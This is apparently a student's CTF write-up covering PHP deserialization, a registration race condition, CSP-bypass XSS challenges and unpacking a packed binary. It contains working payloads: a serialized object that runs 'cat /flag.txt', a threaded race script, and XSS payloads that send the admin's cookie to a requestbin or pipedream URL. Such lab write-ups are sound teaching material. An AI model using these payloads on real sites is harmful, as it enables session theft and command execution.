O:4:"User":5:{s:4:"name";s:3:"123";s:2:"id";i:0;s:7:"isAdmin";b:1;s:6:"solved";a:0:{}s:6:"points";i:999;}
```

~~Thanks to that I managed to print a test challenge in the homepage of the app~~ Actually this is not true, as you'll see later on:

># Welcome to METACTF
>
>Name: Test Challenge
>
>Desc: This is an enabled test challenge
>
>Points: 100

The code above gets printed for every user, admin or not.

#### The solution

Since in the code of the `Challenge` class we can execute arbitrary shell commands, we could try executing `cat /flag.txt`. First we need to instantiate a new object, which we did (Test Challenge). Then we need to delete it, which will call the `__destruct()` magic method, which will call the `stop()` function. If we previously set `$c->stop_cmp = 'cat /flag.txt'`, we should be all set. Still we need a way to manipulate the object...

**`array_push()`**

```php
array_push(array &$array, mixed ...$values): int
```

**array_push()** treats `array` as a stack, and pushes the passed variables onto the end of `array`. The length of `array` increases by the number of variables pushed. Has the same effect as:

```php
<?php
$array[] = $var;
?>
```

**`exec` in PHP**

```php
exec(string $command, array &$output = null, int &$result_code = null): string|false
```

* `command`: The command that will be executed.
* `output`: If the `output` argument is present, then the specified array will be filled with every line of output from the command. Trailing whitespace, such as `\n`, is not included in this array. Note that if the array already contains some elements, **exec()** will append to the end of the array. If you do not want the function to append elements, call [unset()](https://www.php.net/manual/en/function.unset.php) on the array before passing it to **exec()**.
* `result_code`: If the `result_code` argument is present along with the `output` argument, then the return status of the executed command will be written to this variable.

**To recap**

We just needed to serialize a specially crafted `Challenge` object and to put it into the file that would be uploaded...

```php
$c = new Challenge('bogus challenge', "just trying to print the flag, nothing to see here");
$c->stop_cmd = 'cat /flag.txt';
print(serialize($c));
```

Then, after uploading this, we load `index.php` and we'll get:

># Welcome to METACTF
>
>User Backup file: 
>
>
>
>Load User
>
>Stoping challenge!flag{nice_yuo_got_the_unserialize_flag!}

### metarace

Same webapp as metactf, but different exploit: we need to registrate, login and get to the homepage before that the registration is finished. This is because at registration time the user is setted as non admin, which means that he cannot see all the challenges present in the database. If we are able to send a login request and to get the index.php faster than that, we'll be able to print what we need.

* `register.php`

  ```php
  $db->create_user($name, $password);
  $id = $db->get_idusers($name);
  if ($db->get_admin($id) &&  $db->get_username($id) === $name){
    $db->fix_user($id);
  }
  ```

* `login.php`

  ```php
  $id = $db->login($name, $password);
  if (($id != 0) && !is_null($id)){
    echo("<h3>Login Completed!</h3>");
    $_SESSION['challenges'] = $db->get_challenges($id, $db->get_admin($id) );
    $_SESSION['user'] = new User($id, $db->get_username($id));
  }
  ```

* `db.php`

  * `fix_user`

    ```php
    function fix_user($idusers){
            /* Prepared statement, stage 1: prepare */
            if (!($stmt = $this->mysqli->prepare("UPDATE users SET isadmin = 0 WHERE idusers = ?"))) {
                echo "Prepare failed: (" . $this->mysqli->errno . ") " . $this->mysqli->error;
            }
    
            /* Prepared statement, stage 2: bind and execute */
            if (!$stmt->bind_param("i", $idusers)) {
                echo "Binding parameters failed: (" . $stmt->errno . ") " . $stmt->error;
            }
    
            if (!$stmt->execute()) {
                echo "Execute failed: (" . $stmt->errno . ") " . $stmt->error;
            }
    
        }
    ```

  * `get_admin()`

    ```php
    function get_admin($id){
            /* Prepared statement, stage 1: prepare */
            if (!($stmt = $this->mysqli->prepare("SELECT isadmin FROM users WHERE idusers=?"))) {
                echo "Prepare failed: (" . $this->mysqli->errno . ") " . $this->mysqli->error;
            }
    
            /* Prepared statement, stage 2: bind and execute */
            if (!$stmt->bind_param("i", $id)) {
                echo "Binding parameters failed: (" . $stmt->errno . ") " . $stmt->error;
            }
    
            if (!$stmt->execute()) {
                echo "Execute failed: (" . $stmt->errno . ") " . $stmt->error;
            }
    
            if (!($res = $stmt->get_result())) {
                echo "Getting result set failed: (" . $stmt->errno . ") " . $stmt->error;
            }
            $info = $res->fetch_assoc();
            $isadmin = $info['isadmin'] == 1;
            $res->close();
            return $isadmin;
        }
    ```

  * `get_challenges()`

    ```php
    function get_challenges($id, $isadmin){
            if ($isadmin){
                /* Prepared statement, stage 1: prepare */
                if (!($stmt = $this->mysqli->prepare("SELECT name, descriptions, points FROM challenges"))) {
                    echo "Prepare failed: (" . $this->mysqli->errno . ") " . $this->mysqli->error;
                }
            }
            else{
                /* Prepared statement, stage 1: prepare */
                if (!($stmt = $this->mysqli->prepare("SELECT name, descriptions, points FROM challenges WHERE isenabled=true"))) {
                    echo "Prepare failed: (" . $this->mysqli->errno . ") " . $this->mysqli->error;
                }
    
            }
    
            if (!$stmt->execute()) {
                echo "Execute failed: (" . $stmt->errno . ") " . $stmt->error;
            }
    
            if (!($res = $stmt->get_result())) {
                echo "Getting result set failed: (" . $stmt->errno . ") " . $stmt->error;
            }
            $challenges = array();
    
            while ($info = $res->fetch_assoc()){
                array_push($challenges, $info);
            }
            $res->close();
            return $challenges;
        }
    ```

  #### The solution

  Quite straightforward: we setup two threads and we try to login and get to the home page of the website while the registration is still ongoing in order to be faster than the `fix_user` function, which would block access to the database.
  
  ```python
  def registration(s, user, password):
    url = "%s/register.php" % HOST
    r = s.post(url, data={'username': user, 'password_1': password, 'password_2': password, 'reg_user': ''})
    #get_body(r)
    if "Registration Completed!" in r.text:
      return True
    return False 
   
  def login(s, user, password):
    url = "%s/login.php" % HOST
    r = s.post(url, data={'username': user, 'password': password, 'log_user' : ''})
    r = s.get(HOST)
    if 'flag{' in r.text:
      get_body(r)
  
  print('setting up session...')
  s = Session()
  print('starting loop...')
  while True:
    username = randomString(10)
    password = randomString(10)
    r = threading.Thread(target=registration, args=(s, username, password))
    l = threading.Thread(target=login, args=(s, username, password))
    r.start()
    l.start() 
  ```

## XSS

Some notes about CSP:

1. **`default-src`** directive serves as a fallback for the other CSP [fetch directives](https://developer.mozilla.org/en-US/docs/Glossary/Fetch_directive). For each of the following directives that are absent, the user agent looks for the `default-src` directive and uses this value for it.

2. The **`script-src`** directive specifies valid sources for JavaScript. This includes not only URLs loaded directly into [`<script>`](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/script) elements, but also things like inline script event handlers (`onclick`) and [XSLT stylesheets](https://developer.mozilla.org/en-US/docs/Web/XSLT) which can trigger script execution.

3. `object-src 'none'` Prevents fetching and executing plugin resources embedded using `<object>`, `<embed>` or `<applet>` tags. The most common example is Flash.

4. `script-src nonce-{random} 'unsafe-inline'` The `nonce` directive means that `<script>` elements will be allowed to execute only if they contain a *nonce* attribute matching the randomly-generated value which appears in the policy.

   *Note: In the presence of a CSP nonce the `unsafe-inline` directive will be ignored by modern browsers. Older browsers, which don't support nonces, will see `unsafe-inline` and allow inline scripts to execute.*

5. `script-src 'strict-dynamic' https: http:` 'strict-dynamic' allows the execution of scripts dynamically added to the page, as long as they were loaded by a safe, already-trusted script (see the [specification](https://w3c.github.io/webappsec-csp/#strict-dynamic-usage)).

   *Note: In the presence of 'strict-dynamic' the https: and http: whitelist entries will be ignored by modern browsers. Older browsers will allow the loading of scripts from any URL.*

6. `'unsafe-eval'` allows the application to use the `eval()` JavaScript function. This reduces the protection against certain types of DOM-based XSS bugs, but makes it easier to adopt CSP. If your application doesn't use `eval()`, you can remove this keyword and have a safer policy. More on the `eval` function:

### Recall: What is API callback and why are we using it?

From [Bypassing CSP by Abusing JSONP Endpoints | by Mazin Ahmed | Medium](https://medium.com/@mazin.ahmed/bypassing-csp-by-abusing-jsonp-endpoints-47cf453624d5):

JSONP APIs normally works by having a parameter that sets a callback, so that users of the JSONP API can freely use the API according to their code. The GET parameter is reflected on the response in the 0 offset. This means that we basically control the start of the response body. JavaScript is a very dynamic language. It dynamically allows us to do many things we should not do, and are not supposed to do. Let’s use some of JavaScript magic to our side here. What if we enter:

> alert(1);//

as our callback? If no proper sanitization is done on the JSONP endpoint, it will be reflected as the following:

> alert(1);//{“name”: “Mazin”}

This is technically a correct JavaScript code! The syntax is correct as the rest of the response of commented out. JS engines would treat the data as a typical JavaScript code instead of a JSONP endpoint.

### babycsp

Valid JSONP belonging to `*.google.com` that we can use:

 `<script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1337)"></script>`

Since the CSP of the website is:

```javascript
default-src 'self'; script-src 'self' *.google.com; connect-src *
```

#### The exploit

We need a page that makes an HTTP req to reqbins, and that sends to it all the cookies. Then we use the XSS vulnerability on the website of the challenge to make the admin visit that webpage, and we should be all set. More specifically those are the steps to follow:

1. First we setup our requestbin and we copy its url
2. Then we execute a GET to the homepage of the challenge to create a session
3. We perform a POST to create the content on the webapp
4. Then we perform a GET to make the admin visit the url of our post. When loaded it will execute or javascript code, this performing the XSS attack which will send the admin's cookies to our request bin by performing a POST to it with the cookies encoded in the headers.

This is the javascript payload:

```python
payload = """
<script src="https://accounts.google.com/o/oauth2/revoke?callback=
window.location.href = ''.concat('""" + HOOK + """?c=', document.cookie);
"></script>
"""
```

Where `HOOK` is the url of the request bin. Putting that in a post and sending it to the admin will allow us to send the session cookie of the admin, which contains the flag, to our bin embedded as request parameter.

### csp

```javascript
Content-Security-Policy: default-src https://www.google.com https://ajax.googleapis.com 'unsafe-eval'; style-src 'self' https://maxcdn.bootstrapcdn.com/bootstrap/; font-src 'self' https://maxcdn.bootstrapcdn.com/bootstrap/;object-src 'none'
```

Because of `object-src 'none'` we cannot use object, embed or applet tags.

We have user input escaping. More specifically, if I send this text:

```
'';!--"<XSS>=&{()}
```

This is what gets printed:

```
&#39;&#39;;!--&quot;&lt;XSS&gt;=&amp;{()}
```

Which means that we only have `; ! - = {} ()`. Still, we have a vulnerability. In fact there's a specific field, which is the one that is used to add participant names to the event, which is not escaped. As such we can use it to carry our exploit.

#### First approach

Now that we have some attack surface, I started trying some exploits.

* First off, from [Content Security Policy (CSP) Bypass - HackTricks](https://book.hacktricks.xyz/pentesting-web/content-security-policy-csp-bypass):

  `Content-Security-Policy: script-src https://google.com 'unsafe-eval'; `
  
  Working payload:` <script src="data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=="></script>`
  
  But that did not work: 

  `Caricamento non riuscito per lo <script> con sorgente “data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ==”.`.

* This looked promising: `<script src=//ajax.googleapis.com/ajax/services/feed/find?v=1.0%26callback=alert%26context=1337></script>`, but the GET request returns 404.

* `<embed src='//ajax.googleapis.com/ajax/libs/yui/2.8.0r4/build/charts/assets/charts.swf?allowedDomain=\"})))}catch(e){alert(1337)}//' allowscriptaccess=always>` this would not work because this csp blocks embed tags.

* This actually worked:

  ```html
  ><script src="https://www.google.com/complete/search?client=chrome&q=hello&callback=alert#1"></script>
  ```

  But this is tricky, because it basically executes the url and it puts the result as function argument, in this case we've got an `alert`, which means that the result of that google search will be printed as an alert by the browser.

* This other one `<script src="https://www.google.com/tools/feedback/escalation-options?callback=alert(1337)"></script>` actually does something, but from the look of it, its not useful: it just returns a GET with this body:

  ```javascript
  // API callback
  alert1337({})
  ```

#### Solution

A bit disappointing, since I solved this with random code found on the internet. From [CSP - Pentest Book (six2dez.com)](https://pentestbook.six2dez.com/enumeration/web/csp):

```html
<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.4.6/angular.js"></script> <div ng-app> {{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}} </div>
```

**Note**: the payload must be at most 255 characters long!

### strict-csp

```javascript
Content-Security-Policy: default-src 'self'; script-src 'strict-dynamic' 'nonce-Iyt3N79hSx'; style-src 'self' https://stackpath.bootstrapcdn.com/bootstrap/; font-src 'self' https://stackpath.bootstrapcdn.com/bootstrap/;object-src 'none'
```

Here we've got a problem: we have a nonce implemented in the CSP. First thing off, I vaidated it with [CSP Evaluator (csp-evaluator.withgoogle.com)](https://csp-evaluator.withgoogle.com/). From that we can see that we've got a problem derivating from the fact that `base-uri` is missing:

>Missing base-uri allows the injection of base tags. They can be used to set the base URL for all relative (script) URLs to an attacker controlled domain. Can you set it to 'none' or 'self'?

And the same goes for `require-trusted-types-for`:

>Consider requiring Trusted Types for scripts to lock down DOM XSS injection sinks. You can do this by adding "require-trusted-types-for 'script'" to your policy.

The exploit surface here is the `require.js` file. This is enough to solve the challenge:

```html
<script data-main='data:1,window.location.href="https://en1lv1e4jrpywf5.m.pipedream.net?c"+document.cookie;' src='require.js'></script>
```

## Packer

### john

```shell
➜ file john
john: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=297bb194bf0ae17829e37240b7c7b6aa8a327572, stripped
```

```shell
[*] '/home/zerocool/chall/todo/john/john'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

As we know a packer is a type of malware that has an encrypted payload in order to avoid detection during static analysis. At runtime the malicious portion of the code is unpacked, and execute. This means that we need to look for some procedure that manipulates the `.text` section of the executable. From [Unpacking Redaman Malware & Basics of Self-Injection Packers - ft. OALabs (liveoverflow.com)](https://liveoverflow.com/unpacking-buhtrap-malware-basics-of-self-injection-packers-ft-oalabs-2/):

>Self-Injection is just one of the techniques used by malware authors for obfuscation, there are many other techniques like *Process Injection* (or *Process Hollowing*), *Classic DLL Injection* and *Thread Execution Hijacking*. There are a few different techniques for Self-Injection itself, but a common technique is to first unpack a small stub in-memory, it transfers the execution to the stub, <u>the stub code then changes the permission of a section in the process</u>, write the malicious code into those sections and transfer the execution back to the overwritten sections of the PE file.

We have something similare here:

```c
int unpack(uint *param_1,int param_2) {
  uint uVar1;
  uint *puVar2;
  int iVar3;
  
  mprotect((void *)((uint)param_1 & 0xfffff000),0x1000,7);
  uVar1 = *(uint *)(&PTR_DAT_0804c03c)[(int)param_1 % 5];
  puVar2 = param_1;
  iVar3 = param_2;
  do {
    *puVar2 = *puVar2 ^ uVar1;
    puVar2 = puVar2 + 1;
    iVar3 = iVar3 + -1;
  } while (iVar3 != 0);
  (*(code *)param_1)();
  iVar3 = FUN_080491e6(param_1,param_2);
  return iVar3;
}
```

The first argument of the `mprotect` is the address in memory from which we want to start changing permissions. The length is 4096 bytes. This probably means that the malicious code segment is located at `param_1`. By looking at the code at runtime, we can see that the address on which the `mprotect` is called is probably **`0x804970e`**. Also it looks like it ends at `0x804990e`. This means that it is located in this memory page:

```shell
 0x8049000  0x804a000 r-xp     1000 1000   /home/zerocool/chall/todo/john/john
```

which is also the only executable page of the `.text` section. This should be the code we want to examine to find the correct key for this binary:

```assembly
pwndbg> b *0x0804970e
Breakpoint 1 at 0804970e
pwndbg> r
pwndbg> x/30gi 0x804970e
=> 0x804970e:	pop    ss
   0x804970f:	mov    ebp,esp
   0x8049711:	sub    esp,0x18
   0x8049714:	cmp    DWORD PTR [ebp+0x18],0x1
   0x8049718:	jg     0x804973a
   0x804971a:	mov    eax,DWORD PTR [ebp+0x1c]
   0x804971d:	mov    eax,DWORD PTR [eax]
   0x804971f:	sub    esp,0x8
   0x8049722:	push   eax
   0x8049723:	push   0x804a0f8
   0x8049728:	call   0x8049050 <printf@plt>
   0x804972d:	add    esp,0x10
   0x8049730:	sub    esp,0xc
   0x8049733:	push   0x0
   0x8049735:	call   0x8049080 <exit@plt>
   0x804973a:	mov    DWORD PTR [ebp-0xc],0x0
   0x8049741:	mov    eax,DWORD PTR [ebp+0x1c]
   0x8049744:	add    eax,0x4
   0x8049747:	mov    eax,DWORD PTR [eax]
   0x8049749:	sub    esp,0x4
   0x804974c:	push   eax
   0x804974d:	push   0x11
   0x8049752:	push   0x80492a0
   0x8049757:	call   0x804922b
   0x804975c:	add    esp,0x10
   0x804975f:	add    DWORD PTR [ebp-0xc],eax
   0x8049762:	mov    eax,DWORD PTR [ebp+0x1c]
   0x8049765:	add    eax,0x4
   0x8049768:	mov    eax,DWORD PTR [eax]
   0x804976a:	sub    esp,0x4
```

#### Notes from lesson

Basically I was almost right about what was happening here. We have that the main is calling an unpacking routine, which is the `unpack` function above. The `num` parameter is a counter for a loop:

```c
int unpack(uint *func,int size) {
  uint *cur_ptr;
  undefined4 uVar1;
  int count;
  uint key;
                    /* here we're preparing the memory page for malicious code */
  mprotect((void *)((uint)func & 0xfffff000),0x1000,7);
  key = *(uint *)(&arr)[(int)func % 5];
  cur_ptr = func;
  count = size;
  do {
    *cur_ptr = *cur_ptr ^ key;
    cur_ptr = cur_ptr + 1;
    count = count + -1;
  } while (count != 0);
  uVar1 = (*(code *)func)();
  count = pack(uVar1,func,size);
  return count;
}
```

The counter is likely the size of the function to unpack. Note that the key used to decrypt the function depends on the address of the function itself.

We looked at the unpacking routine, but we're still missing the main part.

#### Where do we start?

We have two approaches:

* **Static**: Since we understand the unpacking routine we can build an unpacker and look at it with ghidra.
* **Dynamic**: we could run the binary and use ghidra to look at the unpacked running code, or we can dump the memory of the running binary and look at it.

#### Dynamic approach

We'll break at the `unpack` function with gdb:

```c
unpack((char *)malicious_func_maybe,83,argc,argv);
```

```assembly
                         *******************************************************
                         *                      FUNCTION                       *
                         *******************************************************
                         undefined malicious_func_maybe()
           undefined       AL:1         <RETURN>
                         malicious_func_maybe                      XREF[3]:   																																				main:08049878(*),
                         																			0804a228, 
                                                              0804a444(*)  
      0804970e 17            POP       SS
```

```assembly
pwndbg> b *0x0804970e
Breakpoint 1 at 0804970e
pwndbg> r
pwndbg> x/30gi 0x804970e
=> 0x804970e:	pop    ss
   0x804970f:	mov    ebp,esp
   0x8049711:	sub    esp,0x18
   0x8049714:	cmp    DWORD PTR [ebp+0x18],0x1
   0x8049718:	jg     0x804973a
   0x804971a:	mov    eax,DWORD PTR [ebp+0x1c]
   0x804971d:	mov    eax,DWORD PTR [eax]
   0x804971f:	sub    esp,0x8
   0x8049722:	push   eax
   0x8049723:	push   0x804a0f8
   0x8049728:	call   0x8049050 <printf@plt>
   0x804972d:	add    esp,0x10
   0x8049730:	sub    esp,0xc
   0x8049733:	push   0x0
   0x8049735:	call   0x8049080 <exit@plt>
   0x804973a:	mov    DWORD PTR [ebp-0xc],0x0
   0x8049741:	mov    eax,DWORD PTR [ebp+0x1c]
   0x8049744:	add    eax,0x4
   0x8049747:	mov    eax,DWORD PTR [eax]
   0x8049749:	sub    esp,0x4
   0x804974c:	push   eax
   0x804974d:	push   0x11
   0x8049752:	push   0x80492a0
   0x8049757:	call   0x804922b
   0x804975c:	add    esp,0x10
   0x804975f:	add    DWORD PTR [ebp-0xc],eax
   0x8049762:	mov    eax,DWORD PTR [ebp+0x1c]
   0x8049765:	add    eax,0x4
   0x8049768:	mov    eax,DWORD PTR [eax]
   0x804976a:	sub    esp,0x4
```

Ok up until now I was on the right track. My problem here was that I have no idea on how to read those assembly instructions...

**The problem is that what we're looking at are packed instructions.** If we break at the following line:

```c
uVar1 = (*(code *)func)();
```

And we print the same memory cells we'll see the real code used to get the key!

```assembly
pwndbg> b *0x0804928a
pwndbg> x/30gi 0x804970e
pwndbg> x/30gi 0x804970e
   0x804970e:	push   ebp
   0x804970f:	mov    ebp,esp
   0x8049711:	sub    esp,0x18
   0x8049714:	cmp    DWORD PTR [ebp+0x18],0x1
   0x8049718:	jg     0x804973a
   0x804971a:	mov    eax,DWORD PTR [ebp+0x1c]
   0x804971d:	mov    eax,DWORD PTR [eax]
   0x804971f:	sub    esp,0x8
   0x8049722:	push   eax
   0x8049723:	push   0x804a0f8
   0x8049728:	call   0x8049050 <printf@plt>
   0x804972d:	add    esp,0x10
   0x8049730:	sub    esp,0xc
   0x8049733:	push   0x0
   0x8049735:	call   0x8049080 <exit@plt>
   0x804973a:	mov    DWORD PTR [ebp-0xc],0x0
   0x8049741:	mov    eax,DWORD PTR [ebp+0x1c]
   0x8049744:	add    eax,0x4
   0x8049747:	mov    eax,DWORD PTR [eax]
   0x8049749:	sub    esp,0x4
   0x804974c:	push   eax
   0x804974d:	push   0x11
   0x8049752:	push   0x80492a0
   0x8049757:	call   0x804922b
   0x804975c:	add    esp,0x10
   0x804975f:	add    DWORD PTR [ebp-0xc],eax
   0x8049762:	mov    eax,DWORD PTR [ebp+0x1c]
   0x8049765:	add    eax,0x4
   0x8049768:	mov    eax,DWORD PTR [eax]
   0x804976a:	sub    esp,0x4
```

Ok this makes sense: `push ebp` is how an actual disassembled function starts. Note that we have another function call:

```assembly
   0x8049757:	call   0x804922b
```

Note that this could be another packer... Actually its the address of the `unpack` function. So we're calling another function trough the unpacker. Here's the new function:

```assembly
pwndbg> x/30gi 0x80492a0
   0x80492a0:	push   ebp
   0x80492a1:	mov    ebp,esp
   0x80492a3:	sub    esp,0x18
   0x80492a6:	sub    esp,0x8
   0x80492a9:	push   0x804a039
   0x80492ae:	push   DWORD PTR [ebp+0x18]
   0x80492b1:	call   0x8049030 <strstr@plt>
   0x80492b6:	add    esp,0x10
   0x80492b9:	mov    DWORD PTR [ebp-0xc],eax
   0x80492bc:	mov    eax,DWORD PTR [ebp-0xc]
   0x80492bf:	cmp    eax,DWORD PTR [ebp+0x18]
   0x80492c2:	jne    0x80492cb
   0x80492c4:	mov    eax,0x1
   0x80492c9:	jmp    0x80492e3
   0x80492cb:	sub    esp,0x8
   0x80492ce:	push   DWORD PTR [ebp+0x18]
   0x80492d1:	push   0x804a03f
   0x80492d6:	call   0x8049050 <printf@plt>
   0x80492db:	add    esp,0x10
   0x80492de:	mov    eax,0x0
   0x80492e3:	leave
   0x80492e4:	ret
   0x80492e5:	pop    ss
   0x80492e6:	mov    ecx,0x38aec1d5
   0x80492eb:	mov    bl,0xae
   0x80492ed:	dec    esi
   0x80492ee:	iret
   0x80492ef:	inc    ebp
   0x80492f0:	pop    edx
   0x80492f1:	stos   BYTE PTR es:[edi],al
```

If we look at the code with gdb:

```c
0x80492b1    call   strstr@plt                     <strstr@plt>
        haystack: 0xffffd518 ◂— 'flag{esketit}'
        needle: 0x804a039 ◂— 'flag{'
```

We've got a call to the `strstr` function, and another call to the packer.

**From this behaviour we unedrstand that the check on the flag is performed incrementally by calling `unpack` and the `pack` on some code, and so on. This means that we'll not have a point in time in which during execution the binary is completely unpacked.** Extracting the unpacked code dynamically can be very time consuming, which means that a more efficient method would be to write a script that reverse engineer the packing algorithm, which then can be used to create a binary containing an unpacked payload. This is what the static approach does in a nutshell.

#### Static approach

Let's reverse engineer the packer with python:

```python
import sys
from pwn import u32, p32

if len(sys.argv) < 4:
    print("usage : %s <inputfile> <address> <size>" % sys.argv[0])
    exit(0)

filepath = sys.argv[1]
address = int(sys.argv[2], 16)
size = int(sys.argv[3], 16)

BEG_BIN = 0x08048000
KEY = [0x04030201, 0x40302010, 0x42303042, 0x44414544, 0xffffffff]
ff = open(filepath, "rb")
f = ff.read()
ff.close()

off = address - BEG_BIN
to_decode = f[off: off+(size*4)]
k = KEY[address % 5]

decode = b""
for i in range(size):
    decode += p32(u32(to_decode[i*4: (i+1)*4]) ^ k)

f = f[:off] + decode + f[off+(size*4):]

ff = open(filepath, "wb")
ff.write(f)
ff.close()
```

This gives us a decent unpacked main:

```c
void FUN_0804970e(void)

{
  int iVar1;
  int iVar2;
  int iVar3;
  int iVar4;
  int iVar5;
  int iVar6;
  int iVar7;
  int in_stack_00000014;
  undefined4 *in_stack_00000018;
  
  if (in_stack_00000014 < 2) {
    printf("Usage:\n %s flag{<key>}\n",*in_stack_00000018);
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  iVar1 = FUN_0804922b(FUN_080492a0,0x11,in_stack_00000018[1]);
  iVar2 = FUN_0804922b(FUN_080492e5,0x11,in_stack_00000018[1]);
  iVar3 = FUN_0804922b(FUN_08049329,0x17,in_stack_00000018[1]);
  iVar4 = FUN_0804922b(FUN_080496ab,0x18,in_stack_00000018[1]);
  iVar5 = FUN_0804922b(FUN_080495e4,0x31,in_stack_00000018[1]);
  iVar6 = FUN_0804922b(FUN_08049546,0x27,in_stack_00000018[1],0);
  iVar7 = FUN_0804922b(FUN_0804951f,9,in_stack_00000018[1]);
  if (iVar1 + iVar2 + iVar3 + iVar4 + iVar5 + iVar6 + iVar7 == 7) {
    printf("\x1b[1;37mYou got the flag: \x1b[1;32m%s\x1b[0m\n",in_stack_00000018[1]);
  }
  else {
    printf("\x1b[1;31mLoser\n\x1b[0m");
  }
  return;
}
```

We need to repeat this to unpack every function used to create the flag. The first three, as already seen, are respectively checks on the prefix (`flag{}`),  the suffix (`}`) and the type of characters of the flag (must be ascii). The last one is a check on the flag length (==33). As for the other function we have the following structure:

```
FUN_080496ab (0x18)
	FUN_08049385 (0x36)

FUN_080495e4 (0x31)
	FUN_0804945e (0x30)

FUN_08049546 (0x27)
```

Where the indented functions are calls that are made inside the outer ones. The first function determines the first 6 characters of the flag, which are 'packer'. We are still missing 21 characters, which are originated from `FUN_080495e4` and `FUN_08049546`.

###### `FUN_080496ab`

After unpacking we get:

```c
int FUN_080496ab(void) {
  int flagchar;
  int in_stack_00000014;
  int i;
  char usrinput;
  
  i = 1;
  while( true ) {
    if (6 < i) {
      return 1;
    }
    usrinput = *(char *)(in_stack_00000014 + i + 4);
    flagchar = FUN_0804922b(FUN_08049385,0x36,i);
    if (usrinput != flagchar) break;
    i = i + 1;
  }
  return 0;
}
```

Ok looks like there's another function to unpack: `FUN_08049385`, which becomes:

```c
int FUN_08049385(void) {
  double dVar1;
  double dVar2;
  double dVar3;
  double dVar4;
  int in_stack_00000014;
  
  dVar1 = pow((double)in_stack_00000014,5.0);
  dVar2 = pow((double)in_stack_00000014,4.0);
  dVar3 = pow((double)in_stack_00000014,3.0);
  dVar4 = pow((double)in_stack_00000014,2.0);
  return (int)((float)in_stack_00000014 * 99.65 +
               ((float)(dVar3 * 45.83333358 + (dVar1 * 0.5166666688 - dVar2 * 8.125000037)) -
               (float)dVar4 * 109.875) + 84.0);
}
```

Which we can either reverse engineer with z3, or by looking at which characters are outputed in registers by using gdb (again dynamic approach). After reverse engineering this we'll get that the first part of the flag is `flag{packer`. Since the flag is 33 chars long, we are still missing 21.

###### ` FUN_080495e4`

Looks like we need to reverse engineer this:

```c
undefined4 FUN_080495e4(void) {
  undefined4 uVar1;
  int i;
  undefined4 *puVar2;
  undefined4 *puVar3;
  int in_GS_OFFSET;
  int in_stack_00000014;
  int j;
  undefined4 local_7c [23];
  int canary;
  
  canary = *(int *)(in_GS_OFFSET + 0x14);
  puVar2 = &weird_string;
  puVar3 = local_7c;
                    /* filling local_7c with hardcoded data
                         */
  for (i = 22; i != 0; i = i + -1) {
    *puVar3 = *puVar2;
    puVar2 = puVar2 + 1;
    puVar3 = puVar3 + 1;
  }
  j = 0;
  do {
    if (10 < j) {
      uVar1 = 1;
LAB_08049692:
                    /* exit */
      if (canary != *(int *)(in_GS_OFFSET + 0x14)) {
                    /* WARNING: Subroutine does not return */
        __stack_chk_fail();
      }
      return uVar1;
    }
                    /* here's the real magic */
    i = FUN_0804922b(FUN_0804945e,0x30,(int)*(char *)(in_stack_00000014 + j + 11),local_7c[j * 2],
                     local_7c[j * 2 + 1]);
    if (i == 0) {
      uVar1 = 0;
      goto LAB_08049692;
    }
    if ((*(byte *)(in_stack_00000014 + 0x11) & 1) == 0) {
      uVar1 = 0;
      goto LAB_08049692;
    }
    j = j + 1;
  } while( true );
}
```

WTF is this? From a first look it seems like we're preparing `local_7c` and then we're comparing its content with the flag passed by the user using `FUN_0804945e`. If for some reason the comparison does not go well the function is exited. More specifically it looks like we're comparing each even character of `local_7c` and its successor with every character of the user input. This is the code that is doing the comparison:

```c
bool FUN_0804945e(void) {
  float10 fVar1;
  double dVar2;
  int in_stack_00000014;
  uint in_stack_00000018;
  uint in_stack_0000001c;
  uint local_34;
  uint uStack48;
  
  dVar2 = sqrt((double)in_stack_00000014);
  fVar1 = (float10)powl((float10)in_stack_00000014,SUB104((float10)dVar2,0),
                        (int6)((unkuint10)(float10)dVar2 >> 0x20));
  if (_DAT_0804a1a0 <= fVar1) {
    local_34 = (uint)(longlong)ROUND(fVar1 - _DAT_0804a1a0);
    uStack48 = (uint)((ulonglong)(longlong)ROUND(fVar1 - _DAT_0804a1a0) >> 0x20);
    uStack48 = uStack48 ^ 0x80000000;
  }
  else {
    local_34 = (uint)(longlong)ROUND(fVar1);
    uStack48 = (uint)((ulonglong)(longlong)ROUND(fVar1) >> 0x20);
  }
  return (local_34 + 0x15 ^ in_stack_00000018 |
         uStack48 + (0xffffffea < local_34) ^ in_stack_0000001c) == 0;
}
```

First of all, this is the content of `local_7c`:

```
DDE76FA6 1C000000 F8FC7A35 27020000 15000000 00000000 546C155C 6C010000 DDE76FA6 1C000000 66CE3EE9 9D000000 546C155C 6C010000 546C155C 6C010000 414244F3 56070000 C5A46046 01000000 DDE76FA6 1C000000
```

Which is not something that really makes sense translated in ascii. Actually neither the content of `FUN_0804945e` makes sense, really. If fact I was so done that I tried to bruteforce the checks. Basically, we know that the return value of `FUN_0804945e` must be 1. This means that we can script the execution with a gdbinit and try every possible characters for every position of the flag checked by the function to find what we need.

```shell
❯ p y.py
13:22:02 - starting...
found a char:  flag{packer-
found a char:  flag{packer-4
found a char:  flag{packer-4a3
found a char:  flag{packer-4a3-
found a char:  flag{packer-4a3-1
found a char:  flag{packer-4a3-13
found a char:  flag{packer-4a3-133
found a char:  flag{packer-4a3-1337
finished. took 778.9688053131104 seconds
13:35:01 - characters found: -4a3-1337
exiting...
```

Ok now we know that the flag up to now is: `flag{packer-4a3-1337` something `}`, where the missing part is 12 characters long.

###### `FUN_08049546`

Ok we're still missing 20 characters, identified by this function:

```c
undefined4 FUN_08049546(void) {
  size_t sVar1;
  undefined4 uVar2;
  char *in_stack_00000014;
  int in_stack_00000018;
  
  sVar1 = strlen(in_stack_00000014);
  if (in_stack_00000018 + 0x16U < sVar1) {
    if ((char)(in_stack_00000014[in_stack_00000018 + 0x14] ^ (&DAT_0804a081)[in_stack_00000018]) ==
        in_stack_00000014[in_stack_00000018 + 0x15]) {
